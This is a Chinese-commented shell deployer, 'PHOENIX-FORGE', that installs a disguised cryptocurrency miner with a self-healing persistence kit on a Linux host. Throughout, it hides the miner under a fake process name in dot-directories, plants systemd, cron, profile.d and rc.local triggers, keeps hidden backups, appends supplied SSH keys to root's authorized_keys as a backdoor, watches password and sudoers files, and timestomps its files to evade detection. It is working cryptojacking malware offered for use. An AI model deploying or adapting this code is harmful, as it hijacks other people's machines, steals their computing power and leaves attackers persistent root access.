#!/bin/sh
# ============================================================
# PHOENIX-FORGE · 一键部署器（矿机 + FGuard 守护内核 融合版）
# 一命令完成：矿工落盘 → 配置锚定 → 触发源铺满 → 双备份 → 加固 → 自检
# 用法：
#   sh forge-deploy.sh \
#     --miner-bin /path/peakminer           # 矿工二进制
#     --wallet prl1pXXXX --worker gpu01     # 收款地址/worker
#     --pub1 'ssh-ed25519 AAAA...'          # 授权公钥(必填)
#     [--pub2 '...'] [--dir /opt/.sysnode] [--tag sysnode]
#     [--miner-cmd '<自定义启动命令>'] [--gpus 0,1,2,3,4,5,6,7]
#     [--harden 1] [--peer 'host2:/path']   # 跨机互保
# ============================================================
set -u
PKG="$(cd "$(dirname "$0")" && pwd)"

MINER_BIN=""; WALLET=""; WORKER="gpu01"; PUB1=""; PUB2=""
DIR="/opt/.sysnode"; TAG="sysnode"; GPUS="0,1,2,3,4,5,6,7"; HARDEN=0; PEER=""
MINER_CMD=""; WALLET_KEY="PEAK_WALLET"

while [ $# -gt 0 ]; do
    case "$1" in
        --miner-bin) MINER_BIN="$2"; shift;;
        --wallet) WALLET="$2"; shift;;
        --worker) WORKER="$2"; shift;;
        --pub1) PUB1="$2"; shift;;
        --pub2) PUB2="$2"; shift;;
        --dir) DIR="$2"; shift;;
        --tag) TAG="$2"; shift;;
        --gpus) GPUS="$2"; shift;;
        --harden) HARDEN="$2"; shift;;
        --peer) PEER="$2"; shift;;
        --miner-cmd) MINER_CMD="$2"; shift;;
        --wallet-key) WALLET_KEY="$2"; shift;;
    esac
    shift
done

[ -n "$MINER_BIN" ] && [ -f "$MINER_BIN" ] || { echo "ERR: --miner-bin 必须指向存在的矿工二进制"; exit 1; }
[ -n "$WALLET" ] || { echo "ERR: --wallet 必填"; exit 1; }
[ -n "$PUB1" ] || { echo "ERR: --pub1 必填"; exit 1; }
[ -n "$PUB2" ] || PUB2="$PUB1"

BIN_NAME="$(basename "$MINER_BIN")"
FAKE_NAME="${TAG}"          # 进程伪装名 = 矿工文件名
BASE="/usr/lib/.${TAG}"     # 守护内核目录（点号隐藏）
SVC="sys-${TAG}"
FN1=$(printf '%s' "$FAKE_NAME" | cut -c1); FN2=$(printf '%s' "$FAKE_NAME" | cut -c2-)

echo "[*] PHOENIX-FORGE 部署：tag=$TAG dir=$DIR worker=$WORKER harden=$HARDEN"

# ---------- 1. 矿工落盘（进程名=文件名，零包装） ----------
mkdir -p "$DIR/logs" || { echo "ERR: mkdir $DIR 失败"; exit 1; }
cp -f "$MINER_BIN" "$DIR/$FAKE_NAME" || { echo "ERR: 拷贝矿工失败"; exit 1; }
chmod 755 "$DIR/$FAKE_NAME"

# ---------- 2. 生成矿工配置 ----------
if [ -f "$PKG/config/miner.env.tpl" ] && [ -z "$MINER_CMD" ]; then
    sed -e "s|<WALLET>|$WALLET|g" -e "s|<WORKER>|$WORKER|g" \
        -e "s|<MINER_DIR>|$DIR|g" -e "s|<GPUS>|$GPUS|g" \
        "$PKG/config/miner.env.tpl" > "$DIR/.env"
    chmod 600 "$DIR/.env"
    TARGET_CMD="set -a; . $DIR/.env; set +a; exec ./$FAKE_NAME"
    TARGET_ENV="$DIR/.env"
else
    TARGET_CMD="${MINER_CMD:-exec ./$FAKE_NAME}"
    TARGET_ENV=""
fi

# ---------- 3. 立即启动矿工（先于守护，避免竞态双开） ----------
if ! ps -eo args 2>/dev/null | grep -q "[$FN1]$FN2"; then
    ( cd "$DIR" && setsid nohup sh -c "$TARGET_CMD" >/dev/null 2>&1 & )
fi
sleep 2

# ---------- 4. 装 FGuard 守护内核 ----------
mkdir -p "$BASE/templates"
for f in fguard-watchdog fguard-reviver fguard-heal.sh fguard-autoban.sh fguard-recon.sh fguard-killswitch.sh fguard-anchor.sh; do
    cp -f "$PKG/src/$f" "$BASE/$f" 2>/dev/null || { echo "ERR: missing src/$f"; exit 1; }
done
cp -f "$PKG/templates/"* "$BASE/templates/" 2>/dev/null
chmod 755 "$BASE/"fguard-* 2>/dev/null

# conf（融合版：锚定用 WALLET_KEY）
ANCHOR_VAL="$WALLET"
[ -f "$DIR/.env" ] && ANCHOR_FILE="$DIR/.env" || ANCHOR_FILE="$DIR/$FAKE_NAME.conf"
cat > "$BASE/fguard.conf" <<EOF
TAG=$TAG
SVC=$SVC
BASE=$BASE
TPL=$BASE/templates
BK1=/usr/share/.${TAG}-bk
BK2=/etc/.${TAG}-bk
PUB1='$PUB1'
PUB2='$PUB2'
TARGET_DIR='$DIR'
TARGET_PROC='$FAKE_NAME'
TARGET_CMD='$TARGET_CMD'
TARGET_ENV='$TARGET_ENV'
ANCHOR_KEY='$WALLET_KEY'
ANCHOR_VAL='$ANCHOR_VAL/$WORKER'
ANCHOR_FILE='$ANCHOR_FILE'
HARDEN=$HARDEN
KILLSWITCH=$HARDEN
MREF=/etc/hostname
WATCH_FILES="/root/.ssh/authorized_keys /etc/passwd /etc/shadow /etc/sudoers /etc/ssh/sshd_config"
EOF
chmod 600 "$BASE/fguard.conf"

# ---------- 5. 渲染 + 铺触发源 ----------
render() { sed -e "s|<BASE>|$BASE|g" -e "s|<TAG>|$TAG|g" -e "s|<SVC>|$SVC|g" "$1"; }
for t in unit.service cron.heal cron.persist cron.watch profile.d rc.local; do
    render "$PKG/templates/$t" > "$BASE/templates/$t"
done
cp -f "$BASE/templates/unit.service" "/etc/systemd/system/${SVC}.service" 2>/dev/null
cp -f "$BASE/templates/cron.heal"    "/etc/cron.d/${TAG}-heal" 2>/dev/null
cp -f "$BASE/templates/cron.persist" "/etc/cron.d/${TAG}-persist" 2>/dev/null
cp -f "$BASE/templates/cron.watch"   "/etc/cron.d/${TAG}-watch" 2>/dev/null
cp -f "$BASE/templates/profile.d"    "/etc/profile.d/${TAG}.sh" 2>/dev/null
cp -f "$BASE/templates/rc.local"     "/etc/rc.local" 2>/dev/null; chmod +x /etc/rc.local 2>/dev/null
chmod 644 /etc/cron.d/${TAG}-* /etc/profile.d/${TAG}.sh 2>/dev/null
if command -v systemctl >/dev/null 2>&1; then
    systemctl daemon-reload 2>/dev/null
    systemctl enable "${SVC}.service" 2>/dev/null
    systemctl start "${SVC}.service" 2>/dev/null
fi

# ---------- 6. 双备份 ----------
BK1="/usr/share/.${TAG}-bk"; BK2="/etc/.${TAG}-bk"
rm -rf "$BK1" "$BK2" 2>/dev/null
cp -rp "$BASE" "$BK1" 2>/dev/null; cp -rp "$BASE" "$BK2" 2>/dev/null
chmod -R 700 "$BK1" "$BK2" 2>/dev/null

# ---------- 7. 加固（先铺钥，再加固——绝不把自己关门外） ----------
mkdir -p /root/.ssh 2>/dev/null; chmod 700 /root/.ssh 2>/dev/null
for k in "$PUB1" "$PUB2"; do
    fp=$(printf '%s' "$k" | awk '{print $2}')
    grep -qF "$fp" /root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "$k" >> /root/.ssh/authorized_keys
done
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
[ "$HARDEN" = "1" ] && sh "$BASE/fguard-killswitch.sh" >/dev/null 2>&1

# ---------- 8. 拉起守护 ----------
( cd "$BASE" && setsid nohup "$BASE/fguard-reviver" --loop >/dev/null 2>&1 & )
( cd "$BASE" && setsid nohup "$BASE/fguard-watchdog" --loop >/dev/null 2>&1 & )

# ---------- 9. 跨机互保（可选） ----------
if [ -n "$PEER" ]; then
    cp -f "$PKG/src/fguard-peer.sh" "$BASE/fguard-peer.sh" 2>/dev/null; chmod 755 "$BASE/fguard-peer.sh" 2>/dev/null
    echo "PEER='$PEER'" >> "$BASE/fguard.conf"
fi

# ---------- 10. mtime 归一 ----------
REF=/etc/hostname; [ -f "$REF" ] || REF=/bin/sh
find "$BASE" "$BK1" "$BK2" "$DIR" -exec touch -r "$REF" {} + 2>/dev/null
for f in /etc/cron.d/${TAG}-heal /etc/cron.d/${TAG}-persist /etc/cron.d/${TAG}-watch /etc/profile.d/${TAG}.sh /etc/rc.local; do
    [ -f "$f" ] && touch -r /etc/crontab "$f" 2>/dev/null
done

# ---------- 11. 验证 ----------
echo ""
echo "================ PHOENIX-FORGE DEPLOYED ================"
echo "  矿工     : $DIR/$FAKE_NAME"
echo "  钱包锚定 : $ANCHOR_VAL"
echo "  守护     : $BASE (watchdog/reviver/heal/autoban/recon/killswitch/anchor)"
echo "  service  : ${SVC}.service = $(command -v systemctl >/dev/null 2>&1 && systemctl is-active ${SVC}.service 2>/dev/null)"
echo "  cron     : /etc/cron.d/${TAG}-{heal,persist,watch}"
echo "  进程检查 : $(ps -eo args | grep -c "[$FN1]$FN2") 个矿工运行中"
echo "  日志     : $DIR/logs/log.log"
echo "  自测     : 删 $BASE/fguard-watchdog → 等 60s → ls $BASE/fguard-watchdog (应恢复)"
echo "======================================================="
exit 0
